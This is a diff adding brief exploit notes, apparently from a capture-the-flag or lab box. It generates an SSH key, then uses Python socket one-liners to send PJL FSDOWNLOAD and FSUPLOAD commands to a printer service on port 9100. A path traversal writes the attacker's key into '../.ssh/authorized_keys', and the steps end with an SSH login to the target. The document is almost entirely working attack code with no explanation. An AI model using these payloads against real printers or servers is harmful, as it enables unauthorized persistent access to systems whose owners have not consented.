@@ -1,0 +1,39 @@
+#Step 1:
+
+ssh-keygen -t ed25519 -f archivist_key -N ""
+cat archivist_key.pub
+
+#Create on hacker machine
+
+
+#Step 2:
+
+python3 -c '
+import socket, time
+
+pubkey = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDApHmUFLBo8fKdj1v59fXP8h71KaCnskxK9GxlQBous root@DESKTOP-G17QB9R\n"
+path = "0:../.ssh/authorized_keys"
+size = len(pubkey)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 9100))
+cmd = f"\x1b%-12345X@PJL FSDOWNLOAD NAME=\"{path}\" SIZE={size}\r\n".encode()
+s.send(cmd + pubkey)
+time.sleep(1)
+print(s.recv(4096))
+s.close()
+'
+
+python3 -c '
+import socket, time
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 9100))
+s.send(b"\x1b%-12345X@PJL FSUPLOAD NAME=\"0:../.ssh/authorized_keys\"\r\n\x1b%-12345X")
+time.sleep(1)
+print(s.recv(4096))
+s.close()
+'
+
+#Step 3:
+chmod 600 archivist_key
+ssh -i archivist_key archivist@10.129.150.60
